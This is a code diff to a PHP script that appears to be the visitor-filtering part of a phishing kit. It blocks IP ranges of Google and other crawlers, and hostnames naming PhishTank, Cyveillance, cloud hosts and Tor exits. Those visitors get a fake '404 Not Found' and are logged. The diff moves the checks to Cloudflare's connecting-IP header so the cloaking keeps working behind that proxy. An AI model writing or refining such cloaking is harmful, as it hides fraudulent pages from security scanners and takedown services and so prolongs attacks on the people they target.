@@ -1047,21 +1047,21 @@ $thirtytwo = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^41.79.235.*",
 "^34.211.195.0*",
 "^94.191.*.*");
-if(in_array($_SERVER['REMOTE_ADDR'],$thirtytwo)) {
+if(in_array($_SERVER['HTTP_CF_CONNECTING_IP'],$thirtytwo)) {
      // this is for exact matches of IP address in array
      $ipslist = file_get_contents("zynexroot/inc/logs/denied_visitors.txt");
-     if (strpos($ipslist, $_SERVER['REMOTE_ADDR']) !== true) {
-        file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
+     if (strpos($ipslist, $_SERVER['HTTP_CF_CONNECTING_IP']) !== true) {
+        file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['HTTP_CF_CONNECTING_IP'] . "\n", FILE_APPEND);
      }
      header('HTTP/1.0 404 Not Found');
      exit();
 } else {
      // this is for wild card matches
      foreach($thirtytwo as $ip) {
-          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
+          if(preg_match('/' . $ip . '/',$_SERVER['HTTP_CF_CONNECTING_IP'])){
             $ipslist = file_get_contents("zynexroot/inc/logs/denied_visitors.txt");
-            if (strpos($ipslist, $_SERVER['REMOTE_ADDR']) !== true) {
-               file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
+            if (strpos($ipslist, $_SERVER['HTTP_CF_CONNECTING_IP']) !== true) {
+               file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['HTTP_CF_CONNECTING_IP'] . "\n", FILE_APPEND);
             }
                header('HTTP/1.0 404 Not Found');
                die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
@@ -1069,7 +1069,7 @@ if(in_array($_SERVER['REMOTE_ADDR'],$thirtytwo)) {
      }
 }
 
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$hostname = gethostbyaddr($_SERVER['HTTP_CF_CONNECTING_IP']);
 $blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
 foreach($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
@@ -1081,7 +1081,7 @@ foreach($blocked_words as $word) {
 
 
 
-$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$hostname = gethostbyaddr($_SERVER['HTTP_CF_CONNECTING_IP']);
 $blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit",);
 foreach($blocked_words as $word) {
     if (substr_count($hostname, $word) > 0) {
@@ -1132,16 +1132,16 @@ $thirtytwo = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*",
 "^134.170.2.199", "^65.55.85.12", "^173.194.116.149", "^216.58.211.37" ,
 "^89.163.159.214", "^64.233.*.*", "^66.102.*.*", "^66.249.*.*", "^216.239.*.*" , "^216.33.229.163" ,
 "^64.233.173.*" , "^64.68.90.*");
-if(in_array($_SERVER['REMOTE_ADDR'],$thirtytwo)) {
+if(in_array($_SERVER['HTTP_CF_CONNECTING_IP'],$thirtytwo)) {
     $ipslist = file_get_contents("zynexroot/inc/logs/denied_visitors.txt");
-    if (strpos($ipslist, $_SERVER['REMOTE_ADDR']) !== true) {
-       file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
+    if (strpos($ipslist, $_SERVER['HTTP_CF_CONNECTING_IP']) !== true) {
+       file_put_contents("zynexroot/inc/logs/denied_visitors.txt", $_SERVER['HTTP_CF_CONNECTING_IP'] . "\n", FILE_APPEND);
     }
      header('HTTP/1.0 404 Not Found');
      exit();
 } else {
      foreach($thirtytwo as $ip) {
-          if(preg_match('/' . $ip . '/',$_SERVER['REMOTE_ADDR'])){
+          if(preg_match('/' . $ip . '/',$_SERVER['HTTP_CF_CONNECTING_IP'])){
                header('HTTP/1.0 404 Not Found');
                die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
           }
